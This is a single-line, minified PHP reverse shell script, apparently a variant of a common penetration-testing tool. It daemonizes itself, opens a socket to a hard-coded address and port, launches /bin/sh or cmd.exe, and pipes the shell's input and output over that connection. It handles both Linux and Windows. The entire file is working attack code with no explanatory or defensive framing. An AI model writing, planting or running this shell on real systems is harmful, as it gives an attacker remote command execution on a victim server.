<?php header('Content-Type: text/plain; charset=UTF-8'); class Sh{private $a=null;private $p=null;private $os=null;private $sh=null;private $ds=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $o=array();private $b=1024;private $c=0;private $e=false;public function __construct($a,$p){$this->a=$a;$this->p=$p;if(stripos(PHP_OS,'LINUX')!==false){$this->os='LINUX';$this->sh='/bin/sh';}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){$this->os='WINDOWS';$this->sh='cmd.exe';$this->o['bypass_shell']=true;}else{echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";exit(0);}}private function d(){set_time_limit(0);if(!function_exists('pcntl_fork')){echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";}else{if(($p=pcntl_fork())<0){echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";}else if($p>0){echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";exit(0);}else if(posix_setsid()<0){echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";}else{echo "DAEMONIZE: Completed successfully!\n";}}umask(0);}private function r($s,$n,$b){if(($d=@fread($s,$b))===false){$this->e=true;echo"STRM_ERROR: Cannot read from ${n}, script will now exit...\n";}return $d;}private function w($s,$n,$d){if(($b=@fwrite($s,$d))===false){$this->e=true;echo"STRM_ERROR: Cannot write to ${n}, script will now exit...\n";}return $b;}private function rw($i,$o,$in,$on){while(($d=$this->r($i,$in,$this->b))&&$this->w($o,$on,$d)){echo $d;if($this->os==='WINDOWS'&&$on==='STDIN'){$this->c+=strlen($d);}}}private function brw($i,$o,$in,$on){$s=fstat($i)['size'];if($this->os==='WINDOWS'&&$in==='STDOUT'&&$this->c){$s-=$this->o($i,$in,$this->c);$this->c=0;}$f=ceil($s/$this->b);$r=$s%$this->b;while($f&&($d=$this->r($i,$in,$r&&$f--==1?$r:$this->b))&&$this->w($o,$on,$d)){echo $d;}}private function o($s,$n,$o){$t=$o;while($o>0&&$this->r($s,$n,$o>=$this->b?$this->b:$o)){$o-=$this->b;}return $o>0?$t-$o:$t;}public function rn(){$this->d();$soc=@fsockopen($this->a,$this->p,$en,$es,30);if(!$soc){echo"SOC_ERROR: {$en}: {$es}\n";}else{stream_set_blocking($soc,false);$p=proc_open($this->sh,$this->ds,$pps,'/',null,$this->o);if(!$p){echo "PROC_ERROR: Cannot start the shell\n";}else{foreach($pps as $pp){stream_set_blocking($pp,false);}fwrite($soc,"SOCKET: Shell has connected! PID: ".proc_get_status($p)['pid']."\n");while(!$this->e){if(feof($soc)){echo "SOC_ERROR: Shell connection has been terminated\n";break;}else if(feof($pps[1])||!proc_get_status($p)['running']){echo "PROC_ERROR: Shell process has been terminated\n";break;}$s=array('read'=>array($soc,$pps[1],$pps[2]),'write'=>null,'except'=>null);$ncs=stream_select($s['read'],$s['write'],$s['except'],null);if($ncs===false){echo "STRM_ERROR: stream_select() failed\n";break;}else if($ncs>0){if($this->os==='LINUX'){if(in_array($soc,$s['read'])){$this->rw($soc,$pps[0],'SOCKET','STDIN');}if(in_array($pps[2],$s['read'])){$this->rw($pps[2],$soc,'STDERR','SOCKET');}if(in_array($pps[1],$s['read'])){$this->rw($pps[1],$soc,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($soc,$s['read'])){$this->rw($soc,$pps[0],'SOCKET','STDIN');}if(fstat($pps[2])['size']){$this->brw($pps[2],$soc,'STDERR','SOCKET');}if(fstat($pps[1])['size']){$this->brw($pps[1],$soc,'STDOUT','SOCKET');}}}}foreach($pps as $pp){fclose($pp);}proc_close($p);}fclose($soc);}}}$r_sh=new Sh('127.0.0.1',9000);$r_sh->rn(); ?>
